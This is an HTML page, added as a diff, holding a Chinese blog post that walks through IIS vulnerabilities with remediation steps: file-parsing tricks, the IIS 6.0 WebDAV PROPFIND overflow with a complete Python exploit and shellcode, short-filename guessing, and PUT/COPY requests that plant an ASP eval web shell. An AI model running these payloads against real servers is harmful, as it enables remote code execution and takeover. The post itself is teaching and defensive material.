@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="中间件漏洞 IIS,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="包括IIS文件解析漏洞、IIS命令执行漏洞、IIS短文件名、put漏洞、远程代码执行、">
+<meta name="keywords" content="中间件漏洞 IIS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中间件漏洞之IIS">
+<meta property="og:url" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/index.html">
+<meta property="og:site_name" content="九罹">
+<meta property="og:description" content="包括IIS文件解析漏洞、IIS命令执行漏洞、IIS短文件名、put漏洞、远程代码执行、">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/9.png">
+<meta property="og:updated_time" content="2019-05-21T13:14:15.072Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="中间件漏洞之IIS">
+<meta name="twitter:description" content="包括IIS文件解析漏洞、IIS命令执行漏洞、IIS短文件名、put漏洞、远程代码执行、">
+<meta name="twitter:image" content="http://yoursite.com/2019/05/20/中间件漏洞之IIS/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/20/中间件漏洞之IIS/">
+
+
+
+
+
+  <title>中间件漏洞之IIS | 九罹</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">九罹</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/categories/工具资源/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-briefcase"></i> <br>
+            
+            tools
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/20/中间件漏洞之IIS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wenz1">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/download.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="九罹">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">中间件漏洞之IIS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-20T19:19:02+08:00">
+                2019-05-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/中间件漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">中间件漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  包括IIS文件解析漏洞、IIS命令执行漏洞、IIS短文件名、put漏洞、远程代码执行、
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一、IIS文件解析漏洞"><a href="#一、IIS文件解析漏洞" class="headerlink" title="一、IIS文件解析漏洞"></a>一、IIS文件解析漏洞</h2><p>文件解析漏洞存在于IIS6.0版本和IIS7.5版本，两种版本均存在逻辑问题。</p>
+<h3 id="1-IIS-6-0的文件解析漏洞"><a href="#1-IIS-6-0的文件解析漏洞" class="headerlink" title="1. IIS 6.0的文件解析漏洞"></a>1. IIS 6.0的文件解析漏洞</h3><p>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。</p>
+<p>这一漏洞有两种完全不同的利用方式：</p>
+<ol>
+<li><p><strong>test.asp;.jpg</strong><br>当网站上传点限制后缀名时(IIS主要和asp搭配)，可以利用文件解析漏洞上传如test.asp;.jpg的文件，虽然该文件真正的后缀名是<code>.jpg</code>，但由于含有特殊符号<code>;</code>,仍会被当作<code>asp</code>文件执行，从而造成文件解析漏洞。</p>
+<p><img src="1.png" alt="1"></p>
+</li>
+<li><p><strong>/test.asp/test.jpg</strong><br>当允许新建目录而未对目录名做限制时，可以利用文件解析漏洞新建目录名为test.asp的文件夹绕过（文件目录名为test.asp，目录中的文件会被当做asp执行）</p>
+<p><img src="2.png" alt="2"></p>
+</li>
+</ol>
+<h3 id="2-IIS-7-5文件解析漏洞"><a href="#2-IIS-7-5文件解析漏洞" class="headerlink" title="2. IIS 7.5文件解析漏洞"></a>2. IIS 7.5文件解析漏洞</h3><p>IIS 7.5文件解析漏洞是因为url中只要看到后缀<code>.php</code>，无论是否存在均交给php处理，而php又默认开启<code>cgi.fix_pathinfo</code>，会对文件路径进行整理：从后向前判定是否存在，不存在则删减，存在则当作php文件执行。</p>
+<p>   例如：当php遇到路径为”/aaa.xxx/bbb.yyy”的时侯，若”/aaa.xxx/bbb.yyy”不存在，则会去掉最后的“bbb.yyy”，然后判断”/aaa.xxx”是否存在，若存在，则把“/aaa.xxx”当作文件。</p>
+<p>   若有文件test.jpg，访问时在其后加/.php，便可以把<code>test.jpg/.php</code>交给php，php处理文件路径”test.jpg/.php”得到”test.jpg”，该文件存在，便把该文件作为php程序执行了。</p>
+<h3 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3. 漏洞修复"></a>3. 漏洞修复</h3><p>1）对新建目录文件名进行过滤，比如不允许新建包含<code>.</code>的文件夹；<br>2）取消网站后台新建目录的功能，不允许新建目录；<br>3）限制上传文件的执行权限，不允许执行脚本；<br>4）过滤.asp/xx.jpg，通过ISApi组件过滤，在httpd.ini中加入过滤规则(但此方法在server2003中未搜索到该文件)。<br>5）升级IIS版本</p>
+<h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>IIS6.0的解析漏洞同样存在于IIS 5.x的版本，而IIS7.5的畸形解析漏洞的攻击方法同样适用于IIS7.0和Nginx&lt;8.03版本。</p>
+<h2 id="IIS远程命令执行漏洞"><a href="#IIS远程命令执行漏洞" class="headerlink" title="IIS远程命令执行漏洞"></a>IIS远程命令执行漏洞</h2><p>IIS 6.0命令执行漏洞，在开启WebDav服务的情况下存在可远程执行漏洞</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在IIS 6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p>
+<p><img src="3.png" alt="3"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在本地执行exp，github上有开源exp：<a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">https://github.com/edwardz246003/IIS_exploit</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.</span><br><span class="line">#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China </span><br><span class="line">#-----------Email: edwardz@foxmail.com</span><br><span class="line">import socket  </span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">sock.connect((&apos;192.168.1.160&apos;,80))  </span><br><span class="line">pay=&apos;PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n&apos;</span><br><span class="line">pay+=&apos;If: &lt;http://localhost/aaaaaaa&apos;</span><br><span class="line">pay+=&apos;\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac&apos;</span><br><span class="line">pay+=&apos;&gt;&apos;</span><br><span class="line">pay+=&apos; (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb&apos;</span><br><span class="line">pay+=&apos;\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81&apos;</span><br><span class="line">shellcode=&apos;VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA&apos;</span><br><span class="line">pay+=shellcode</span><br><span class="line">pay+=&apos;&gt;\r\n\r\n&apos;</span><br><span class="line">print pay</span><br><span class="line">sock.send(pay)  </span><br><span class="line">data = sock.recv(80960)  </span><br><span class="line">print data </span><br><span class="line">sock.close</span><br></pre></td></tr></table></figure></p>
+<p>运行脚本攻击目标机，执行成功后弹出计算器</p>
+<p><img src="4.png" alt="4"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1）将IIS管理器的扩展组件WebDav禁用即可修复，修复后运行脚本不会弹窗<br>2）使用相关防护设备</p>
+<h2 id="IIS短文件名猜解"><a href="#IIS短文件名猜解" class="headerlink" title="IIS短文件名猜解"></a>IIS短文件名猜解</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>IIS的短文件名机制，即为了兼容16位MS-DOS程序，Windows为文件名较长的（计算后缀名文件名长度大于9）文件（和文件夹）生成了对应的windows 8.3短文件名。</p>
+<p>利用IIS短文件名机制，可以暴力猜解短文件名，尝试猜解后台地址、敏感文件甚至直接下载对应的文件。但局限于只能猜解长文件名前六位和扩展名前3位，同时需要IIS和.net两个条件都满足。访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。</p>
+<p><img src="5.png" alt="5"></p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在c:/Inetpub/wwwroot目录下新建对比文件夹12345678，123456789，对比文件aaaaaa.asp</p>
+<ol>
+<li><p>尝试访问192.168.1.160/122*~1****/a.asp和192.168.1.160/123*~1****/a.asp,得到不同的结果；根据返回结果的不同可以逐个猜解短文件名<br>使用了好几个星号是为了程序化自动猜解，逐个猜解后缀名，事实上由于星号可以匹配空，所以一个和多个星号并无区别。</p>
+<p>访问192.168.1.160/122*~1****/a.asp：</p>
+<p><img src="6.png" alt="6"></p>
+<p>访问192.168.1.160/123*~1****/a.asp:</p>
+<p><img src="7.png" alt="7"></p>
+</li>
+<li><p>尝试192.168.1.160/aaaaaa~1/a.asp（猜解无后缀，正常返回则为文件夹）和192.168.1.160/aaaaaa~1****/a.asp（猜解为文件）</p>
+<p>访问192.168.1.160/aaaaaa~1/a.asp：</p>
+<p><img src="8.png" alt="8"></p>
+<p>访问192.168.1.160/aaaaaa~1****/a.asp：</p>
+<p><img src="6.png" alt="6"></p>
+<p>根据不同的回显我们可以判断正在猜解的对象是文件还是文件夹。</p>
+</li>
+</ol>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ol>
+<li>升级.net frameework;</li>
+<li>修改注册表，禁用短文件名功能<br>命令窗口输入regedit打开注册表窗口，找到路径：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>，将其中的 NtfsDisable8dot3NameCreation这一项的值设为<code>1</code>,表示不创建短文件名格式，修改完成后，需要重启系统生效。</li>
+<li>cmd关闭NTFS 8.3文件格式的支持；</li>
+<li>将web文件夹的内容拷贝到另一个位置，如c:\www到d:\w,然后删除原文件夹，再将拷贝的文件夹移动回来,重命名d:\w到c:\www。</li>
+</ol>
+<p>补充：目前有比较好的IIS短文件名检查工具，下载地址为：<a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a></p>
+<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>1) 此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；<br>2) 如果文件名本身太短（无短文件名）也是无法猜解的；<br>3) 如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</p>
+<h2 id="PUT-对IIS写权限的利用"><a href="#PUT-对IIS写权限的利用" class="headerlink" title="PUT(对IIS写权限的利用)"></a>PUT(对IIS写权限的利用)</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>条件：开启WebDAV和写权限，IIS 6.0<br>开启WebDAV之后，IIS就支持PROPFIND、PROPPATCH、MKCOL、DELETE、PUT、COPY、MOVE、LOCK、UNLOCK等方法了<br>当IIS中的配置允许写入的时候就可以直接PUT文件上去，由此可能引发非常严重的安全问题，强烈建议禁制</p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用burp抓包，将GET请求改为OPTIONS</p>
+<p><img src="9.png" alt="9"></p>
+<p>如果Response包有<code>Public: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK</code>,则说明存在漏洞<br>如果存在PUT方法，则可以尝试写入一个txt文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.txt  HTTP/1.1</span><br><span class="line">Host:thief.one</span><br><span class="line">Content-length:30</span><br><span class="line"></span><br><span class="line">&lt;%eval request(&quot;nmask&quot;)%&gt;</span><br></pre></td></tr></table></figure></p>
+<p>返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。通过MOVE或COPY方法改文件后缀名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">COPY /shell.txt  HTTP/1.1</span><br><span class="line">Host:thief.one</span><br><span class="line"></span><br><span class="line">Destination:http://thief.one/shell.asp</span><br></pre></td></tr></table></figure></p>
+<p>拿到shell后，使用菜刀连接，能会在WEB服务器上上传、修改或删除WEB页面、脚本和文件，从而达到网页篡改，控制服务器的目的。</p>
+<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>禁止WebDAV功能和写权限</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/中间件漏洞-IIS/" rel="tag"># 中间件漏洞 IIS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/14/web服务器之IIS/" rel="next" title="web服务器之IIS">
+                <i class="fa fa-chevron-left"></i> web服务器之IIS
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/download.jpg" alt="Wenz1">
+            
+              <p class="site-author-name" itemprop="name">Wenz1</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
